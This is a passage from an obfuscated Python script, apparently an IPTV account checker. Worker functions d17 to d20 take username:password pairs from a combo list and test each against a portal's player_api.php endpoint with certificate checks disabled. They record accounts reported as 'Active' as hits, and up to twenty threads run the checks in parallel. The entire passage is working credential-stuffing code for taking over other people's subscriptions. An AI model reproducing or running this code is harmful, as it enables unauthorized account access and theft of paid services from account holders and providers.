			     	onay (O0000000OOO0OO0O0 ,O0OOOO0000O0O0O00 ,OO00O0O0O0O0OOO0O )#line:1068
def d17 ():#line:1072
	global hit #line:1073
	OOO0O0000OOO0OO0O =0 #line:1074
	for OOOO000OOO00OO0OO in range (17 ,uz ,botsay ):#line:1075
		O0O0O000OOOO000O0 =re .search (pattern ,totLen [OOOO000OOO00OO0OO ],re .IGNORECASE )#line:1076
		if O0O0O000OOOO000O0 :#line:1077
			 OO0OOO00O00OO00OO =totLen [OOOO000OOO00OO0OO ].split (":")#line:1078
			 try :#line:1079
			 	OOO00OOOO00O0OOOO =str (OO0OOO00O00OO00OO [0 ].replace (" ",""))#line:1080
			 except :#line:1081
			 	OOOOO00O000O00O00 ='feyzo'#line:1082
			 try :#line:1083
			 	O0O0OOO00OOOO0OOO =str (OO0OOO00O00OO00OO [1 ].replace (" ",""))#line:1084
			 	O0O0OOO00OOOO0OOO =str (O0O0OOO00OOOO0OOO .replace ('\n',""))#line:1085
			 except :#line:1086
			 	O0O0OOO00OOOO0OOO ='feyzo'#line:1087
			 OOO0O0000OOO0OO0O =int (OOO0O0000OOO0OO0O )+1 #line:1088
			 O0O00O0O000O0OO0O ='Bot_17'#line:1089
			 O0OOO000O0O0OO000 =""#line:1090
			 O0OOO000O0O0OO000 =round (((OOOO000OOO00OO0OO )/(uz )*100 ),2 )#line:1091
			 echox (OOO00OOOO00O0OOOO ,O0O0OOO00OOOO0OOO ,O0O00O0O000O0OO0O ,OOOO000OOO00OO0OO ,O0OOO000O0O0OO000 ,hit )#line:1092
			 OOO0OO0OO0000OOOO ="http://"+portal +"/player_api.php?username="+OOO00OOOO00O0OOOO +"&password="+O0O0OOO00OOOO0OOO +"&type=m3u"#line:1095
			 OO00OOO00OO0OOOO0 =0 #line:1096
			 O0O00OOO00OOO0O0O =""#line:1097
			 while True :#line:1098
			 	try :#line:1099
			 		OOO0OOOOO00OO00OO =ses .get (OOO0OO0OO0000OOOO ,headers =HEADERd ,timeout =15 ,verify =False )#line:1100
			 		break #line:1101
			 	except :#line:1102
			 		OO00OOO00OO0OOOO0 =OO00OOO00OO0OOOO0 +1 #line:1103
			 		time .sleep (4 )#line:1104
			 		if OO00OOO00OO0OOOO0 ==100 :#line:1105
			 		      quit ()#line:1106
			 O0O00OOO00OOO0O0O =str (OOO0OOOOO00OO00OO .text )#line:1107
			 if 'username'in O0O00OOO00OOO0O0O :#line:1108
			     OO0O0OO0000O0O000 =O0O00OOO00OOO0O0O .split ('status":')[1 ]#line:1110
			     OO0O0OO0000O0O000 =OO0O0OO0000O0O000 .split (',')[0 ]#line:1111
			     OO0O0OO0000O0O000 =OO0O0OO0000O0O000 .replace ('"',"")#line:1112
			     if OO0O0OO0000O0O000 =='Active':#line:1113
			     	print ('🌟 🌟 🇭 🇮 🇹🌟 🌟 ')#line:1114
			     	hit =hit +1 #line:1115
			     	onay (O0O00OOO00OOO0O0O ,OOO00OOOO00O0OOOO ,O0O0OOO00OOOO0OOO )#line:1116
def d18 ():#line:1119
	global hit #line:1120
	OO00OO0OO0O000000 =0 #line:1121
	for OO00O0OO000OO00O0 in range (18 ,uz ,botsay ):#line:1122
		O000O0OOOOOO0OOOO =re .search (pattern ,totLen [OO00O0OO000OO00O0 ],re .IGNORECASE )#line:1123
		if O000O0OOOOOO0OOOO :#line:1124
			 O0O000O0O0OOO0000 =totLen [OO00O0OO000OO00O0 ].split (":")#line:1125
			 try :#line:1126
			 	OOO0O000OOOOOO0OO =str (O0O000O0O0OOO0000 [0 ].replace (" ",""))#line:1127
			 except :#line:1128
			 	OO00O00O0000OO00O ='feyzo'#line:1129
			 try :#line:1130
			 	OOOO00O00000OOO0O =str (O0O000O0O0OOO0000 [1 ].replace (" ",""))#line:1131
			 	OOOO00O00000OOO0O =str (OOOO00O00000OOO0O .replace ('\n',""))#line:1132
			 except :#line:1133
			 	OOOO00O00000OOO0O ='feyzo'#line:1134
			 OO00OO0OO0O000000 =int (OO00OO0OO0O000000 )+1 #line:1135
			 O0O00OOO0OOOO0O00 ='Bot_18'#line:1136
			 O00000O00OOOOOOOO =""#line:1137
			 O00000O00OOOOOOOO =round (((OO00O0OO000OO00O0 )/(uz )*100 ),2 )#line:1138
			 echox (OOO0O000OOOOOO0OO ,OOOO00O00000OOO0O ,O0O00OOO0OOOO0O00 ,OO00O0OO000OO00O0 ,O00000O00OOOOOOOO ,hit )#line:1139
			 O0OOOO0O0OO0O0OO0 ="http://"+portal +"/player_api.php?username="+OOO0O000OOOOOO0OO +"&password="+OOOO00O00000OOO0O +"&type=m3u"#line:1142
			 O0OOOO0O00OOOO000 =0 #line:1143
			 O00O0O000OOO000OO =""#line:1144
			 while True :#line:1145
			 	try :#line:1146
			 		O000OO00O0O0O00OO =ses .get (O0OOOO0O0OO0O0OO0 ,headers =HEADERd ,timeout =15 ,verify =False )#line:1147
			 		break #line:1148
			 	except :#line:1149
			 		O0OOOO0O00OOOO000 =O0OOOO0O00OOOO000 +1 #line:1150
			 		time .sleep (4 )#line:1151
			 		if O0OOOO0O00OOOO000 ==100 :#line:1152
			 		      quit ()#line:1153
			 O00O0O000OOO000OO =str (O000OO00O0O0O00OO .text )#line:1154
			 if 'username'in O00O0O000OOO000OO :#line:1155
			     O0OOO0O00OO0OOO0O =O00O0O000OOO000OO .split ('status":')[1 ]#line:1157
			     O0OOO0O00OO0OOO0O =O0OOO0O00OO0OOO0O .split (',')[0 ]#line:1158
			     O0OOO0O00OO0OOO0O =O0OOO0O00OO0OOO0O .replace ('"',"")#line:1159
			     if O0OOO0O00OO0OOO0O =='Active':#line:1160
			     	print ('🌟 🌟 🇭 🇮 🇹🌟 🌟 ')#line:1161
			     	hit =hit +1 #line:1162
			     	onay (O00O0O000OOO000OO ,OOO0O000OOOOOO0OO ,OOOO00O00000OOO0O )#line:1163
def d19 ():#line:1166
	global hit #line:1167
	O000OOO00O0OOOO00 =0 #line:1168
	for O0OO0O0OO0OO0O0OO in range (19 ,uz ,botsay ):#line:1169
		OOO0O0OOOO0OOOO00 =re .search (pattern ,totLen [O0OO0O0OO0OO0O0OO ],re .IGNORECASE )#line:1170
		if OOO0O0OOOO0OOOO00 :#line:1171
			 O0O0000O0OOOOOO0O =totLen [O0OO0O0OO0OO0O0OO ].split (":")#line:1172
			 try :#line:1173
			 	O000O0OOOO0O0OOO0 =str (O0O0000O0OOOOOO0O [0 ].replace (" ",""))#line:1174
			 except :#line:1175
			 	O0O000000OOO0000O ='feyzo'#line:1176
			 try :#line:1177
			 	OO00O0OOOO00OOO00 =str (O0O0000O0OOOOOO0O [1 ].replace (" ",""))#line:1178
			 	OO00O0OOOO00OOO00 =str (OO00O0OOOO00OOO00 .replace ('\n',""))#line:1179
			 except :#line:1180
			 	OO00O0OOOO00OOO00 ='feyzo'#line:1181
			 O000OOO00O0OOOO00 =int (O000OOO00O0OOOO00 )+1 #line:1182
			 O0O0OOO000O00OO0O ='Bot_19'#line:1183
			 O0OOO0O0O00O00O00 =""#line:1184
			 O0OOO0O0O00O00O00 =round (((O0OO0O0OO0OO0O0OO )/(uz )*100 ),2 )#line:1185
			 echox (O000O0OOOO0O0OOO0 ,OO00O0OOOO00OOO00 ,O0O0OOO000O00OO0O ,O0OO0O0OO0OO0O0OO ,O0OOO0O0O00O00O00 ,hit )#line:1186
			 O0O0O000O0O0O0O0O ="http://"+portal +"/player_api.php?username="+O000O0OOOO0O0OOO0 +"&password="+OO00O0OOOO00OOO00 +"&type=m3u"#line:1189
			 OOO00000OO00O0O00 =0 #line:1190
			 OOOO00OOOO0O00O00 =""#line:1191
			 while True :#line:1192
			 	try :#line:1193
			 		OO000O00OO00OOOO0 =ses .get (O0O0O000O0O0O0O0O ,headers =HEADERd ,timeout =15 ,verify =False )#line:1194
			 		break #line:1195
			 	except :#line:1196
			 		OOO00000OO00O0O00 =OOO00000OO00O0O00 +1 #line:1197
			 		time .sleep (4 )#line:1198
			 		if OOO00000OO00O0O00 ==100 :#line:1199
			 		      quit ()#line:1200
			 OOOO00OOOO0O00O00 =str (OO000O00OO00OOOO0 .text )#line:1201
			 if 'username'in OOOO00OOOO0O00O00 :#line:1202
			     OOO0OO00O00O0O000 =OOOO00OOOO0O00O00 .split ('status":')[1 ]#line:1204
			     OOO0OO00O00O0O000 =OOO0OO00O00O0O000 .split (',')[0 ]#line:1205
			     OOO0OO00O00O0O000 =OOO0OO00O00O0O000 .replace ('"',"")#line:1206
			     if OOO0OO00O00O0O000 =='Active':#line:1207
			     	print ('🌟 🌟 🇭 🇮 🇹🌟 🌟 ')#line:1208
			     	hit =hit +1 #line:1209
			     	onay (OOOO00OOOO0O00O00 ,O000O0OOOO0O0OOO0 ,OO00O0OOOO00OOO00 )#line:1210
def d20 ():#line:1213
	global hit #line:1214
	O0000OO000000OOO0 =0 #line:1215
	for OO00000OO0000OO0O in range (20 ,uz ,botsay ):#line:1216
		OOO00OOOO0OOO00O0 =re .search (pattern ,totLen [OO00000OO0000OO0O ],re .IGNORECASE )#line:1217
		if OOO00OOOO0OOO00O0 :#line:1218
			 O00OOOOOOO0OO00O0 =totLen [OO00000OO0000OO0O ].split (":")#line:1219
			 try :#line:1220
			 	O00OO00O00OOO00O0 =str (O00OOOOOOO0OO00O0 [0 ].replace (" ",""))#line:1221
			 except :#line:1222
			 	OOO0000O00OOO0OO0 ='feyzo'#line:1223
			 try :#line:1224
			 	OOO00O0OO00000000 =str (O00OOOOOOO0OO00O0 [1 ].replace (" ",""))#line:1225
			 	OOO00O0OO00000000 =str (OOO00O0OO00000000 .replace ('\n',""))#line:1226
			 except :#line:1227
			 	OOO00O0OO00000000 ='feyzo'#line:1228
			 O0000OO000000OOO0 =int (O0000OO000000OOO0 )+1 #line:1229
			 O0O0O00O0000OOO00 ='Bot_20'#line:1230
			 OOO0O0OO000O00000 =""#line:1231
			 OOO0O0OO000O00000 =round (((OO00000OO0000OO0O )/(uz )*100 ),2 )#line:1232
			 echox (O00OO00O00OOO00O0 ,OOO00O0OO00000000 ,O0O0O00O0000OOO00 ,OO00000OO0000OO0O ,OOO0O0OO000O00000 ,hit )#line:1233
			 O0O0O000O00O0OOO0 ="http://"+portal +"/player_api.php?username="+O00OO00O00OOO00O0 +"&password="+OOO00O0OO00000000 +"&type=m3u"#line:1236
			 OO0OOOO00O0OO0O0O =0 #line:1237
			 OO000O000O000OO00 =""#line:1238
			 while True :#line:1239
			 	try :#line:1240
			 		OOO0O0000OO000O0O =ses .get (O0O0O000O00O0OOO0 ,headers =HEADERd ,timeout =15 ,verify =False )#line:1241
			 		break #line:1242
			 	except :#line:1243
			 		OO0OOOO00O0OO0O0O =OO0OOOO00O0OO0O0O +1 #line:1244
			 		time .sleep (4 )#line:1245
			 		if OO0OOOO00O0OO0O0O ==100 :#line:1246
			 		      quit ()#line:1247
			 OO000O000O000OO00 =str (OOO0O0000OO000O0O .text )#line:1248
			 if 'username'in OO000O000O000OO00 :#line:1249
			     O0000OO000OO00OOO =OO000O000O000OO00 .split ('status":')[1 ]#line:1251
			     O0000OO000OO00OOO =O0000OO000OO00OOO .split (',')[0 ]#line:1252
			     O0000OO000OO00OOO =O0000OO000OO00OOO .replace ('"',"")#line:1253
			     if O0000OO000OO00OOO =='Active':#line:1254
			     	print ('🌟 🌟 🇭 🇮 🇹🌟 🌟 ')#line:1255
			     	hit =hit +1 #line:1256
			     	onay (OO000O000O000OO00 ,O00OO00O00OOO00O0 ,OOO00O0OO00000000 )#line:1257
t1 =threading .Thread (target =d1 )#line:1260
t2 =threading .Thread (target =d2 )#line:1261
t3 =threading .Thread (target =d3 )#line:1262
t4 =threading .Thread (target =d4 )#line:1263
t5 =threading .Thread (target =d5 )#line:1264
t6 =threading .Thread (target =d6 )#line:1265
t7 =threading .Thread (target =d7 )#line:1266
t8 =threading .Thread (target =d8 )#line:1267
t9 =threading .Thread (target =d9 )#line:1268
t10 =threading .Thread (target =d10 )#line:1269
t11 =threading .Thread (target =d11 )#line:1270
t12 =threading .Thread (target =d12 )#line:1271
t13 =threading .Thread (target =d13 )#line:1272
t14 =threading .Thread (target =d14 )#line:1273
t15 =threading .Thread (target =d15 )#line:1274
t16 =threading .Thread (target =d16 )#line:1275
t17 =threading .Thread (target =d17 )#line:1276
t18 =threading .Thread (target =d18 )#line:1277
t19 =threading .Thread (target =d19 )#line:1278
t20 =threading .Thread (target =d20 )#line:1279
t1 .start ()#line:1281
if botsay ==2 or botsay ==3 or botsay ==4 or botsay ==5 or botsay ==6 or botsay ==7 or botsay ==8 or botsay ==9 or botsay ==10 or botsay ==11 or botsay ==12 or botsay ==13 or botsay ==14 or botsay ==15 or botsay ==16 or botsay ==17 or botsay ==18 or botsay ==19 or botsay ==20 :#line:1283
	t2 .start ()#line:1284
if botsay ==3 or botsay ==4 or botsay ==5 or botsay ==6 or botsay ==7 or botsay ==8 or botsay ==9 or botsay ==10 or botsay ==11 or botsay ==12 or botsay ==13 or botsay ==14 or botsay ==15 or botsay ==16 or botsay ==17 or botsay ==18 or botsay ==19 or botsay ==20 :#line:1285
	t3 .start ()#line:1286
if botsay ==4 or botsay ==5 or botsay ==6 or botsay ==7 or botsay ==8 or botsay ==9 or botsay ==10 or botsay ==11 or botsay ==12 or botsay ==13 or botsay ==14 or botsay ==15 or botsay ==16 or botsay ==17 or botsay ==18 or botsay ==19 or botsay ==20 :#line:1287
	t4 .start ()#line:1288
if botsay ==5 or botsay ==6 or botsay ==7 or botsay ==8 or botsay ==9 or botsay ==10 or botsay ==11 or botsay ==12 or botsay ==13 or botsay ==14 or botsay ==15 or botsay ==16 or botsay ==17 or botsay ==18 or botsay ==19 or botsay ==20 :#line:1289
	t5 .start ()#line:1290
if botsay ==6 or botsay ==7 or botsay ==8 or botsay ==9 or botsay ==10 or botsay ==11 or botsay ==12 or botsay ==13 or botsay ==14 or botsay ==15 or botsay ==16 or botsay ==17 or botsay ==18 or botsay ==19 or botsay ==20 :#line:1291
	t6 .start ()#line:1292
if botsay ==7 or botsay ==8 or botsay ==9 or botsay ==10 or botsay ==11 or botsay ==12 or botsay ==13 or botsay ==14 or botsay ==15 or botsay ==16 or botsay ==17 or botsay ==18 or botsay ==19 or botsay ==20 :#line:1293
	t7 .start ()#line:1294
if botsay ==8 or botsay ==9 or botsay ==10 or botsay ==11 or botsay ==12 or botsay ==13 or botsay ==14 or botsay ==15 or botsay ==16 or botsay ==17 or botsay ==18 or botsay ==19 or botsay ==20 :#line:1295
	t8 .start ()#line:1296
if botsay ==9 or botsay ==10 or botsay ==11 or botsay ==12 or botsay ==13 or botsay ==14 or botsay ==15 or botsay ==16 or botsay ==17 or botsay ==18 or botsay ==19 or botsay ==20 :#line:1297
	t9 .start ()#line:1298
if botsay ==10 or botsay ==11 or botsay ==12 or botsay ==13 or botsay ==14 or botsay ==15 or botsay ==16 or botsay ==17 or botsay ==18 or botsay ==19 or botsay ==20 :#line:1299
	t10 .start ()#line:1300
if botsay ==11 or botsay ==12 or botsay ==13 or botsay ==14 or botsay ==15 or botsay ==16 or botsay ==17 or botsay ==18 or botsay ==19 or botsay ==20 :#line:1301
	t11 .start ()#line:1302
if botsay ==12 or botsay ==13 or botsay ==14 or botsay ==15 or botsay ==16 or botsay ==17 or botsay ==18 or botsay ==19 or botsay ==20 :#line:1303
	t12 .start ()#line:1304
if botsay ==13 or botsay ==14 or botsay ==15 or botsay ==16 or botsay ==17 or botsay ==18 or botsay ==19 or botsay ==20 :#line:1305
	t13 .start ()#line:1306
if botsay ==14 or botsay ==15 or botsay ==16 or botsay ==17 or botsay ==18 or botsay ==19 or botsay ==20 :#line:1307
	t14 .start ()#line:1308
if botsay ==15 or botsay ==16 or botsay ==17 or botsay ==18 or botsay ==19 or botsay ==20 :#line:1309
	t15 .start ()#line:1310
if botsay ==16 or botsay ==17 or botsay ==18 or botsay ==19 or botsay ==20 :#line:1311
	t16 .start ()#line:1312
if botsay ==17 or botsay ==18 or botsay ==19 or botsay ==20 :#line:1313
	t17 .start ()#line:1314
if botsay ==18 or botsay ==19 or botsay ==20 :#line:1315
	t18 .start ()#line:1316
if botsay ==19 or botsay ==20 :#line:1317
	t19 .start ()#line:1318
if botsay ==20 :#line:1319
	t20 .start ()#line:1320
